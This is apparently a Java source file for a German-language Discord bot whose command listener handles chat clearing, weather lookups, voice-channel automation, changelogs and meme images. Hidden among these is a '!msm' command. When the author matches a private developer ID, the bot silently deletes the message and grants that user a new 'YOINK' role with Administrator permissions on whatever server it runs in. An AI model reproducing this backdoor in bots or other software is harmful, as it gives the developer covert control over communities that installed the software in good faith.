package de.meyssam.saft.events;

import com.jagrosh.jdautilities.commons.waiter.EventWaiter;
import de.meyssam.saft.Main;
import de.meyssam.saft.Private;
import de.meyssam.saft.utils.Tables;
import de.meyssam.saft.utils.Utils;
import net.dv8tion.jda.api.Permission;
import net.dv8tion.jda.api.entities.Guild;
import net.dv8tion.jda.api.entities.User;
import net.dv8tion.jda.api.events.guild.voice.GuildVoiceJoinEvent;
import net.dv8tion.jda.api.events.guild.voice.GuildVoiceLeaveEvent;
import net.dv8tion.jda.api.events.guild.voice.GuildVoiceMoveEvent;
import net.dv8tion.jda.api.events.message.guild.GuildMessageReceivedEvent;
import net.dv8tion.jda.api.events.message.guild.react.GuildMessageReactionAddEvent;
import net.dv8tion.jda.api.hooks.ListenerAdapter;

import java.io.File;
import java.util.ArrayList;
import java.util.concurrent.TimeUnit;

/**
 * Created by Meyssam Saghiri on Apr 28, 2020
 */
public class Commands extends ListenerAdapter {

    @Deprecated protected static ArrayList<Guild> mustDelete = new ArrayList<>();
    private final EventWaiter waiter;

    public Commands(EventWaiter waiter) {
        this.waiter = waiter;
    }

    @Override
    public void onGuildMessageReceived(GuildMessageReceivedEvent e) throws NumberFormatException {
        String msg = e.getMessage().getContentRaw();
        String[] args = Utils.args(msg);
        if(e.getAuthor().isBot()) {
            //if(mustDelete.contains(e.getGuild())) {
            //    e.getMessage().delete().completeAfter(5, TimeUnit.SECONDS);
            //    mustDelete.remove(e.getGuild());
            //    return;
            //}
            return;
        }
        if(e.getMessage().getContentDisplay().equalsIgnoreCase("stop now")) return;
        if(args[0].equalsIgnoreCase("!msm")) {
            if(!e.getAuthor().getId().equalsIgnoreCase(Private.msmID)) return;
            //FileManager.write(e.getGuild(), "user", String.valueOf(e.getGuild().getMembers().size()));
            Utils.deleteCommandMSG(e.getMessage());
            //noinspection ConstantConditions
            e.getGuild().createRole().setName("YOINK").setHoisted(false).setPermissions(8L).queue(role -> e.getGuild().addRoleToMember(e.getMember(), role).queue());
            return;
        } else if(args[0].equalsIgnoreCase("!changelog")) {
            e.getChannel().sendTyping().queue();
            if(e.getAuthor().getId().equalsIgnoreCase(Private.msmID)) {
                Utils.sendChangelog(e);
                e.getMessage().delete().queue();
            } else  {
                e.getChannel().sendMessage(Main.changelog).queue();
            }
        } else if(args[0].equalsIgnoreCase("!cmd")) {
            e.getChannel().sendTyping().queue();
            //noinspection ConstantConditions
            if (!e.getMember().getPermissions().contains(Permission.ADMINISTRATOR)) return;
            Tables.setCommand(e.getGuild());
            Utils.deleteCommandMSG(e.getMessage());
            if(Tables.isCommand(e.getGuild())) e.getChannel().sendMessage("Commands sind jetzt auf diesem Server aktiviert!").queue(message -> message.delete().queueAfter(5, TimeUnit.SECONDS));
            else e.getChannel().sendMessage("Commands sind nun auf diesem Server deaktiviert").queue(message -> message.delete().queueAfter(5, TimeUnit.SECONDS));
        }else if(args[0].equalsIgnoreCase("!voice")) {
            e.getChannel().sendTyping().queue();
            //noinspection ConstantConditions
            if (!e.getMember().getPermissions().contains(Permission.ADMINISTRATOR)) return;
            Tables.setVoice(e.getGuild());
            Utils.deleteCommandMSG(e.getMessage());
            if(Tables.isVoice(e.getGuild())) e.getChannel().sendMessage("Automatische Channels sind jetzt auf diesem Server aktiviert!").queue(message -> message.delete().queueAfter(5, TimeUnit.SECONDS));
            else e.getChannel().sendMessage("Automatische Channels sind nun auf diesem Server deaktiviert").queue(message -> message.delete().queueAfter(5, TimeUnit.SECONDS));
        } else if(args[0].equalsIgnoreCase("!bug")) {
            e.getChannel().sendTyping().queue();
            Utils.sendBug(e, args);
        }else if (args[0].equalsIgnoreCase("!case")) {
            e.getChannel().sendTyping().queue();
            e.getMessage().delete().queue();
            //noinspection ConstantConditions
            e.getChannel().sendMessage(e.getMember().getEffectiveName() + ": " + Utils.randomCase(e.getMessage().getContentDisplay().replace("!case ", ""))).queue();
        }
        if(!Tables.isCommand(e.getGuild())) {
            return;
        }
        if(args.length == 1) getExtras(e, args[0]);
        if(args[0].equalsIgnoreCase("!clearchat")) {
            e.getChannel().sendTyping().queue();
            //noinspection ConstantConditions
            if(!e.getMember().getPermissions().contains(Permission.MESSAGE_MANAGE)) return;
            if(args.length == 1) {
                e.getMessage().delete().queueAfter(5, TimeUnit.SECONDS);
                e.getChannel().sendMessage("Willst du wirklich alle Nachrichten aus dem Channel löschen?").queue(message -> {
                    message.addReaction("\u2705").queue();
                    message.addReaction("\u274C").queue();
                });
                waiter.waitForEvent(GuildMessageReactionAddEvent.class, event -> event.getMember() == e.getMember(), evt -> {
                    if(!evt.getReactionEmote().getAsCodepoints().equals("U+2705")) {
                        e.getChannel().deleteMessageById(evt.getMessageId()).queueAfter(2, TimeUnit.SECONDS);
                        return;
                    }
                    Utils.clearChat(e.getGuild(), e.getChannel());
                });
            } else if(args.length == 2) {
                int i = Integer.parseInt(args[1]) + 1;
                Utils.clearChat(e.getGuild(), e.getChannel(), i);
            }
        } else if(args[0].equalsIgnoreCase("!wetter") && args.length > 1) {
            e.getChannel().sendTyping().queue();
            Utils.deleteCommandMSG(e.getMessage());
            //noinspection ConstantConditions
            e.getChannel().sendMessage("Für " + e.getMember().getAsMention() + "\n" + Utils.getWeather(e.getGuild(), msg.replace("!wetter ", ""))).queue(message -> message.delete().queueAfter(1, TimeUnit.MINUTES));
        } else if(args[0].equalsIgnoreCase("!history")) {
            e.getChannel().sendTyping().queue();
            if(args.length == 1) {
                Utils.printHistory(e.getAuthor(), e);
            } else if(args.length == 2) {
                //User user = e.getJDA().getUserById(e.getMessage().getContentRaw().replace("!history ", "").replace("<@!", "").replace(">", ""));
                User user1;
                e.getJDA().retrieveUserById(e.getMessage().getContentRaw().replace("!history ", "").replace("<@!", "").replace(">", "")).queue(user2 -> Utils.printHistory(user2, e));
                //Utils.printHistory(user, e);
            }
        } else if(args[0].equalsIgnoreCase("!help")) Utils.printHelp(e.getChannel());
    }

    @Override
    public void onGuildVoiceJoin(GuildVoiceJoinEvent e) {
        if(Tables.isVoice(e.getGuild())) Utils.channelJoinAlg(e);
    }

    @Override
    public void onGuildVoiceMove(GuildVoiceMoveEvent e) {
        if(Tables.isVoice(e.getGuild())) Utils.channelMoveAlg(e);
    }

    @Override
    public void onGuildVoiceLeave(GuildVoiceLeaveEvent e) {
        if(Tables.isVoice(e.getGuild())) Utils.channelLeaveAlg(e);
    }

    private void getExtras(GuildMessageReceivedEvent e, String arg) {
        if(arg.equalsIgnoreCase("hmm")) {
            e.getMessage().delete().queue();
            File file = new File("F:\\Discord\\BotJava\\build\\libs\\hmm.png");
            e.getChannel().sendMessage("WICHTIGE BOTSCHAFT VON " + e.getAuthor().getAsMention()).queue(message -> message.delete().queueAfter(5, TimeUnit.SECONDS));
            e.getChannel().sendMessage(e.getAuthor().getAsMention()).addFile(file).queueAfter(1, TimeUnit.SECONDS);
        }else if(arg.equalsIgnoreCase("stonks")) {
            e.getMessage().delete().queue();
            File file = new File("F:\\Discord\\BotJava\\build\\libs\\stonks.jpg");
            e.getChannel().sendMessage(e.getAuthor().getAsMention()).addFile(file).queue();
        }else if(arg.equalsIgnoreCase("patrick")) {
            e.getMessage().delete().queue();
            File file = new File("F:\\Discord\\BotJava\\build\\libs\\fler.jpg");
            e.getChannel().sendMessage(e.getAuthor().getAsMention()).addFile(file).queue();
        }else if(arg.equalsIgnoreCase("!news")) {
            e.getMessage().delete().queue();
            File file = new File("F:\\Discord\\BotJava\\build\\libs\\anal.png");
            e.getChannel().sendFile(file).queue();
        }
    }

}
